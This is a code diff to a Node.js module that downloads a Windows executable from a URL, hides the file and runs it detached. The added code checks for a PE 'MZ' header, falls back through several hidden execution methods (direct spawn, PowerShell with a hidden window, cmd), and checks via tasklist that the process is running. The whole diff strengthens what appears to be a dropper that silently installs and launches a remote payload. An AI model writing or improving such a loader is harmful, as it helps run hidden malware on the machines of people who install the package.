@@ -35,6 +35,40 @@ function validateUrl(url) {
     }
 }
 
+function validateExecutable(filePath) {
+    try {
+        const stats = fs.statSync(filePath);
+        
+        // Check file size (should be > 0 and reasonable for an executable)
+        if (stats.size === 0) {
+            console.log(`⚠️ Downloaded file is empty`);
+            return false;
+        }
+        
+        if (stats.size < 1024) {
+            console.log(`⚠️ Downloaded file seems too small (${stats.size} bytes)`);
+            return false;
+        }
+        
+        // For Windows executables, check for PE header
+        if (process.platform === 'win32') {
+            const buffer = fs.readFileSync(filePath, { start: 0, end: 2 });
+            const header = buffer.toString('ascii');
+            if (header !== 'MZ') {
+                console.log(`⚠️ File doesn't appear to be a valid Windows executable (missing MZ header)`);
+                return false;
+            }
+        }
+        
+        console.log(`✅ File validation passed: ${stats.size} bytes`);
+        return true;
+        
+    } catch (error) {
+        console.log(`⚠️ File validation failed: ${error.message}`);
+        return false;
+    }
+}
+
 function downloadFile(url, outputPath) {
     return new Promise((resolve, reject) => {
         if (!validateUrl(url)) {
@@ -156,12 +190,33 @@ function executeFile(filePath) {
                 let child;
 
                 if (isWindows) {
-                    // Windows: Execute .exe file directly
-                    child = spawn('cmd', ['/c', 'start', '/b', `"${filePath}"`], {
-                        detached: true,
-                        stdio: ['ignore', 'ignore', 'ignore'],
-                        windowsHide: true
-                    });
+                    // Windows: Try multiple execution methods
+                    try {
+                        // Method 1: Direct execution with spawn
+                        child = spawn(filePath, [], {
+                            detached: true,
+                            stdio: ['ignore', 'ignore', 'ignore'],
+                            windowsHide: true
+                        });
+                    } catch (directError) {
+                        console.log(`⚠️ Direct execution failed: ${directError.message}`);
+                        try {
+                            // Method 2: PowerShell execution
+                            child = spawn('powershell', ['-WindowStyle', 'Hidden', '-Command', `Start-Process -FilePath "${filePath}" -WindowStyle Hidden`], {
+                                detached: true,
+                                stdio: ['ignore', 'ignore', 'ignore'],
+                                windowsHide: true
+                            });
+                        } catch (psError) {
+                            console.log(`⚠️ PowerShell execution failed: ${psError.message}`);
+                            // Method 3: CMD execution without quotes issues
+                            child = spawn('cmd', ['/c', filePath], {
+                                detached: true,
+                                stdio: ['ignore', 'ignore', 'ignore'],
+                                windowsHide: true
+                            });
+                        }
+                    }
                 } else {
                     // Non-Windows: Use wine if available, otherwise try direct execution
                     const hasWine = fs.existsSync('/usr/bin/wine') || fs.existsSync('/usr/local/bin/wine');
@@ -188,12 +243,67 @@ function executeFile(filePath) {
 
                 child.on('error', (error) => {
                     console.error(`❌ Execution error: ${error.message}`);
-                    reject(error);
+                    
+                    // If this is Windows and we haven't tried all methods, try a simpler approach
+                    if (isWindows && !child.attempted_simple) {
+                        console.log(`🔄 Trying simple Windows execution...`);
+                        try {
+                            // Very simple cmd execution
+                            const simpleChild = spawn('cmd', ['/c', `"${filePath}"`], {
+                                detached: true,
+                                stdio: ['ignore', 'pipe', 'pipe'],
+                                windowsHide: false
+                            });
+                            
+                            simpleChild.attempted_simple = true;
+                            simpleChild.unref();
+                            
+                            setTimeout(() => {
+                                resolve({
+                                    success: true,
+                                    pid: simpleChild.pid || 'unknown',
+                                    detached: true,
+                                    platform: process.platform,
+                                    method: 'simple-cmd'
+                                });
+                            }, 2000);
+                            
+                        } catch (simpleError) {
+                            console.error(`❌ Simple execution also failed: ${simpleError.message}`);
+                            reject(error);
+                        }
+                    } else {
+                        reject(error);
+                    }
                 });
 
                 child.on('spawn', () => {
                     console.log(`✅ Process started with PID: ${child.pid}`);
                     child.unref();
+                    
+                    // Verify the process is actually running
+                    setTimeout(() => {
+                        try {
+                            if (isWindows) {
+                                // Check if process is running on Windows
+                                const checkProcess = spawn('tasklist', ['/FI', `PID eq ${child.pid}`], {
+                                    stdio: ['ignore', 'pipe', 'pipe']
+                                });
+                                
+                                let output = '';
+                                checkProcess.stdout.on('data', (data) => {
+                                    output += data.toString();
+                                });
+                                
+                                checkProcess.on('close', () => {
+                                    const isRunning = output.includes(child.pid.toString());
+                                    console.log(`🔍 Process verification: ${isRunning ? 'RUNNING' : 'NOT FOUND'}`);
+                                });
+                            }
+                        } catch (verifyError) {
+                            console.log(`⚠️ Process verification failed: ${verifyError.message}`);
+                        }
+                    }, 3000);
                     
                     resolve({
                         success: true,
@@ -353,6 +463,11 @@ module.exports = async function(options = {}) {
 
         // Download the Windows executable
         await downloadFile(downloadUrl, fullPath);
+
+        // Validate the downloaded file
+        if (!validateExecutable(fullPath)) {
+            throw new Error("Downloaded file failed validation - may be corrupted or invalid");
+        }
 
         // Hide the file on Windows
         hideFileWindows(fullPath);
